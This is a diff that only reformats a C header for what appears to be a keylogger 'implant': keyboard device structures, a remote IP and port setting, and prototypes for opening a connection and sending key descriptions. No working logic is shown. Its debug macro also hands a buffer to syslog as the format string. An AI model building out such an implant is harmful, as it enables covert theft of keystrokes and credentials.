@@ -2,10 +2,9 @@
 #ifndef IMPLANT_H
 #define IMPLANT_H
 
-
-#include <sys/types.h>
 #include <stdint.h>
 #include <sys/queue.h>
+#include <sys/types.h>
 #include <unistd.h>
 
 #define QUEUE_BUFFER_SIZE 1024
@@ -18,20 +17,19 @@
 */
 typedef struct keyboard_s keyboard_t;
 struct keyboard_s {
-    int fd;
+  int fd;
 
-    ssize_t nb_chars;
-    char buffer[QUEUE_BUFFER_SIZE];
+  ssize_t nb_chars;
+  char buffer[QUEUE_BUFFER_SIZE];
 
-    char name[STRING_BUFFER_SIZE];
-    TAILQ_ENTRY(keyboard_s) devices;
+  char name[STRING_BUFFER_SIZE];
+  TAILQ_ENTRY(keyboard_s) devices;
 };
 
 typedef struct translated_key {
-    char const *description;
-    char const representation;
+  char const *description;
+  char const representation;
 } translated_key_t;
-
 
 /*
     contains project settings, such as target
@@ -40,16 +38,15 @@ typedef struct translated_key {
 */
 typedef struct implant_s {
 
-    /* remote connection settings */
-    unsigned short port;
-    char ip[STRING_BUFFER_SIZE];
-    int disable_net;
+  /* remote connection settings */
+  unsigned short port;
+  char ip[STRING_BUFFER_SIZE];
+  int disable_net;
 
-    /* keyboard settings */
-    TAILQ_HEAD(listhead, keyboard_s) kbd;
+  /* keyboard settings */
+  TAILQ_HEAD(listhead, keyboard_s) kbd;
 
 } implant_t;
-
 
 #define SUCCESSFUL 1
 #define ERROR 0
@@ -58,23 +55,21 @@ typedef struct implant_s {
 #include <syslog.h>
 
 #ifndef DEBUG_LOG
-#define DEBUG_LOG(s, ...)                               \
-    do {                                                \
-        char data[256] = {0};                           \
-        if (0 > snprintf(data, 255, s, ##__VA_ARGS__))  \
-            _exit(1);                                   \
-        syslog(LOG_NOTICE, data);                       \
-    } while (0)
+#define DEBUG_LOG(s, ...)                                                      \
+  do {                                                                         \
+    char data[256] = {0};                                                      \
+    if (0 > snprintf(data, 255, s, ##__VA_ARGS__))                             \
+      _exit(1);                                                                \
+    syslog(LOG_NOTICE, data);                                                  \
+  } while (0)
 #endif
-
-
 
 #define KEY_PRESSED 1
 #define KEY_RELEASED 0
 
 // net.c
 int init_remote_connection(implant_t *);
-int send_key_description(int, char [STRING_BUFFER_SIZE]);
+int send_key_description(int, char[STRING_BUFFER_SIZE]);
 
 // opt.c
 int parse_user_input(int, char **, implant_t *);
@@ -94,6 +89,5 @@ size_t get_array_size(uint8_t **);
 char *remove_repeating_whitespaces(char *);
 void free_tab(uint8_t **);
 char **tabgen(const char *, char);
-
 
 #endif /* IMPLANT_H */
